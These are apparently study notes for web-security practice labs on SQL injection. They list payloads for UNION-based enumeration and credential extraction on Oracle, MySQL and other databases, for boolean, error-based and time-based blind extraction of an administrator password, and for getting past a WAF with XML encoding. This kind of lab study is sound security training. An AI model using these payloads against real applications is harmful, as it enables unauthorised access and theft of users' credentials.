# Practitioner

## UNION-based SQL Injection

### 3. Querying database type and version (Oracle)

**Goal:** Retrieve the database version.

**Key Idea:** Use `UNION SELECT` and Oracle's `v$version` table.

**Payload:** ' UNION SELECT BANNER, NULL FROM v$version--

---

### 4. Querying database version (MySQL / Microsoft)

**Goal:** Retrieve DB version.

**Payload:** ' UNION SELECT @@version, NULL#

---

### 5. Listing database contents (Non-Oracle)

**Goal:** Extract usernames and passwords.

**Steps**
1. Enumerate tables  
2. Enumerate columns  
3. Extract credentials  

**Key Queries**

List tables: ' UNION SELECT table_name, NULL FROM information_schema.tables--

List columns: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xxx'--

Extract credentials: ' UNION SELECT username, password FROM users_xxx--

---

### 6. Listing database contents (Oracle)

**Goal:** Extract credentials from Oracle database.

**Key Queries**

List tables: ' UNION SELECT table_name, NULL FROM all_tables--

List columns: ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_XXX'--


Extract credentials:

' UNION SELECT USERNAME_XXX, PASSWORD_XXX FROM USERS_XXX--

---

### 7. UNION attack – determining number of columns

**Goal:** Find number of columns returned by the query.

**Technique:** Increment `NULL` values until the query succeeds.

**Example:** ' UNION SELECT NULL,NULL--


---

### 8. UNION attack – finding text column

**Goal:** Identify which column accepts string data.

**Technique:** Replace `NULL` with a string.

**Example:** ' UNION SELECT 'test', NULL, NULL--

---

### 9. UNION attack – retrieving data from other tables

**Goal:** Extract usernames and passwords.

**Payload:** ' UNION SELECT username, password FROM users--

---

### 10. Retrieving multiple values in one column

**Goal:** Extract credentials when only one column supports text.

**Technique:** Concatenate values.

**Payload:** ' UNION SELECT NULL, username || '~' || password FROM users--


---

# Blind SQL Injection

### 11. Blind SQL injection with conditional responses

**Goal:** Extract admin password using boolean conditions.

**Technique:** Observe when the **"Welcome back"** message appears.

**Example condition:** ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a


---

### 12. Blind SQL injection with conditional errors

**Goal:** Extract admin password using database errors.

**Technique:** Trigger divide-by-zero errors conditionally.

**Example:** '||(SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'


---

### 13. Visible error-based SQL injection

**Goal:** Leak data through verbose error messages.

**Technique:** Force type casting errors to reveal query results.

**Example:** ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--


---

# Time-based Blind SQL Injection

### 14. Blind SQL injection with time delays

**Goal:** Trigger a delay to confirm injection.

**Payload:** '||pg_sleep(10)--


---

### 15. Blind SQL injection with time delays and data extraction

**Goal:** Extract admin password using conditional delays.

**Example:** ';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a')
THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--


---

# WAF Bypass SQL Injection

### 16. SQL injection with filter bypass via XML encoding

**Goal:** Extract credentials despite a WAF.

**Technique**
- Encode payload using XML entities  
- Concatenate username and password  
**Example:** 1 UNION SELECT username || '~' || password FROM users
Encoded inside XML to bypass filtering.
